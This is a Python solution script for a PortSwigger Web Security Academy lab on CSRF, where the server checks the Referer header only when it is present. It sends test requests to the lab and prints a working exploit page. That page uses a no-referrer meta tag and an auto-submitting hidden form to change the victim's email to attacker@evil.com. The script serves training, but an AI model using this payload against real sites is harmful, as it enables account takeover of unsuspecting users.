# Lab 11 — CSRF where Referer validation depends on header being present
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
#
# Vulnerability: Referer validated only when present — absent Referer is accepted
# Aim:           Change victim's email by suppressing the Referer header
#
# Technique:
#   Server logic: if Referer is present AND wrong → reject. Absent → accepted.
#   Add <meta name="referrer" content="no-referrer"> to the exploit page.
#   This instructs the browser to send no Referer header with any requests
#   made from the page → the server's Referer check is never triggered.
#
#   This script:
#     1. Confirms a request with a wrong Referer is rejected
#     2. Confirms a request with no Referer is accepted
#     3. Prints the exploit with the no-referrer meta tag
#
#   📝 The Referer header (note: misspelled in the HTTP spec — it should be
#      Referrer) tells the server which page the request came from. Browsers
#      send it automatically, but it can be suppressed with Referrer-Policy.
#      This is a legitimate privacy feature that completely breaks Referer-based
#      CSRF protection — which is why tokens are always preferred over Referer checks.
#
# Usage: python csrf_lab11.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        check_email_changed, print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_EMAIL   = "wiener-changed@evil.com"
VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 11 — CSRF: REFERER VALIDATION DEPENDS ON HEADER BEING PRESENT")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab11.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: wrong Referer → should be rejected ───────────────────────────
    print("\n  ── Step 1: send request with wrong Referer — expect rejection\n")
    r_bad = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL},
        headers={"Referer": "https://evil.com/"},
        allow_redirects=True
    )
    if r_bad.status_code == 400 or "Invalid" in r_bad.text or "Referer" in r_bad.text:
        print("  ✔  Wrong Referer → rejected")
    else:
        print(f"  ?  Status {r_bad.status_code} — inspect manually")

    # ── Step 2: no Referer → should be accepted ───────────────────────────────
    print("\n  ── Step 2: send request with NO Referer — expect acceptance\n")

    # Simply send without specifying any Referer header
    # Note: setting Referer to "" does NOT suppress it — omitting it entirely does
    r_no_ref = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL},
        allow_redirects=True
    )
    check_email_changed(r_no_ref.text, TEST_EMAIL)

    # ── Step 3: exploit ───────────────────────────────────────────────────────
    section("Step 3: Exploit HTML for the exploit server")

    exploit = f"""\
<!-- Suppress the Referer header on all requests from this page -->
<meta name="referrer" content="no-referrer">

<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
</form>
<script>document.forms[0].submit();</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  The meta referrer tag suppresses the Referer header entirely.")
    print("     Server only rejects wrong Referers — absent passes right through.")
